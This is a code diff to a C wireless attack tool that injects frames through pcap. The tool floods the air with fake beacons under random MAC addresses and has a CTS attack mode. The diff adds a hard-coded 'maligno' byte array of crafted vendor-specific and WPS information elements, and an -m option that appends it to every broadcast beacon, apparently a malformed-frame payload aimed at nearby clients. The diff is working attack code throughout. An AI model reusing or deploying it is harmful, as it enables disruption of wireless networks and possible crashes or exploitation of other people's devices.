@@ -48,15 +48,30 @@ struct __attribute__ ((__packed__)) beacon {
 	struct radiotap radiotap;
 	struct wifi wifi;
 	struct mgmt mgmt;
-	struct {
-		struct tlv tlv;
-		uint8_t data[8];
-	} srate;
-	struct {
-		struct tlv tlv;
-		char data[33];
-	} essid;
+	struct tlv srate;
+	uint8_t srate_data[8];
+	struct tlv essid;
+	char essid_data[33];
 };
+
+const char maligno[] = {
+	0x1a, 0x00,
+
+	0x90, 0x4c, 0x34, 0x06, 0x05, 0x1b, 0x00, 0x00,
+	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+	0x00, 0x3d, 0x16, 0x06, 0x05, 0x1b, 0x00, 0x00,
+	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+	0x00, 0x00, 0xdd, 0x09, 0x00, 0x03, 0x7f, 0x01,
+	0x01, 0x00, 0x00, 0xff, 0x7f, 0xdd, 0x0a, 0x00,
+	0x03, 0x7f, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00,
+	0x00, 0xdd, 0x0e, 0x00, 0x50, 0xf2,
+
+	0x04, 0x10, 0x4a, 0x00, 0x01, 0x10, 0x10, 0x44,
+	0x00, 0x01, 0x02,
+};
+
 
 static char ** load_words(char *path, int *lines)
 {
@@ -91,19 +106,19 @@ static char ** load_words(char *path, int *lines)
 	/* set pointers */
 	words = malloc(*lines * sizeof(*words));
 	for(*lines = 0, last = filecont; last < filecont + len; ) {
-		int i;
+		int i, l;
 		if(!*last) {
 			last++;
 			continue;
 		}
-		len = strlen(last);
-		for(i = 0; i < len; i++)
+		l = strlen(last);
+		for(i = 0; i < l; i++)
 			if(!isalnum(last[i])) {
-				last += len;
+				last += l;
 				continue;
 			}
 		words[(*lines)++] = last;
-		last += len + 1;
+		last += l + 1;
 	}
 
 	return words;
@@ -125,7 +140,7 @@ static inline void randaddr(uint8_t *addr)
 	addr[5] = rand();
 }
 
-static void beaconize(pcap_t *pcap, char *words[], int lines, useconds_t delay, int packets)
+static void beaconize(pcap_t *pcap, char *words[], int lines, useconds_t delay, int packets, int male)
 {
 	struct beacon template = {
 		.radiotap.length = htole16(sizeof(struct radiotap)),
@@ -138,28 +153,35 @@ static void beaconize(pcap_t *pcap, char *words[], int lines, useconds_t delay, 
 			.capabilities = htole16(0x0401)
 		},
 		.srate = {
-			.tlv = {
-				.type = 0x01,
-				.length = 0x08,
-			},
-			.data = { 0x82, 0x84, 0x8b, 0x96, 0x12, 0x24, 0x48, 0x6c }
+			.type = 0x01,
+			.length = 0x08,
 		},
+		.srate_data = { 0x82, 0x84, 0x8b, 0x96, 0x12, 0x24, 0x48, 0x6c }
 	};
 
 	while(packets) {
 		char *word = words[rand() % lines];
-		template.essid.tlv.length = strlen(word);
+		template.essid.length = strlen(word);
 
 		/* maximum allowed by standard */
-		if(template.essid.tlv.length > 32)
+		if(template.essid.length > 32)
 			continue;
 
 		/* fake but valid mac address */
 		randaddr(template.wifi.saddr);
 		*template.wifi.bssid = *template.wifi.saddr;
-		strcpy(template.essid.data, word);
-		if(!pcap_inject(pcap, &template, sizeof(template) - sizeof(template.essid.data) + template.essid.tlv.length))
-			exit(0);
+		strcpy(template.essid_data, word);
+		if(!male) {
+			if(!pcap_inject(pcap, &template, sizeof(template) - sizeof(template.essid_data) + template.essid.length))
+				exit(0);
+		} else {
+			int size = sizeof(template) - sizeof(template.essid_data) + template.essid.length;
+			char buffer[size + sizeof(maligno)];
+			memcpy(buffer, &template, size);
+			memcpy(buffer + size, maligno, sizeof(maligno));
+			if(!pcap_inject(pcap, buffer, sizeof(buffer)))
+				exit(0);
+		}
 
 		if(delay)
 			usleep(delay);
@@ -198,8 +220,9 @@ int main(int argc, char *argv[])
 	enum attack attack = INVALID;
 	useconds_t delay = 0;
 	int packets = -1;
+	int male = 0;
 
-	while((c = getopt(argc, argv, "bcf:i:p:")) != -1) {
+	while((c = getopt(argc, argv, "bcf:i:p:m")) != -1) {
 		switch(c) {
 		case 'f':
 			words = load_words(optarg, &lines);
@@ -216,6 +239,9 @@ int main(int argc, char *argv[])
 			break;
 		case 'p':
 			packets = atoi(optarg);
+			break;
+		case 'm':
+			male = 1;
 			break;
 		}
 	}
@@ -240,7 +266,7 @@ int main(int argc, char *argv[])
 	switch(attack) {
 	case BEACON:
 		printf("beaconing on %s...\n", argv[optind]);
-		beaconize(pcap, words, lines, delay, packets);
+		beaconize(pcap, words, lines, delay, packets, male);
 		break;
 	case CTS:
 		printf("CTSing on %s...\n", argv[optind]);
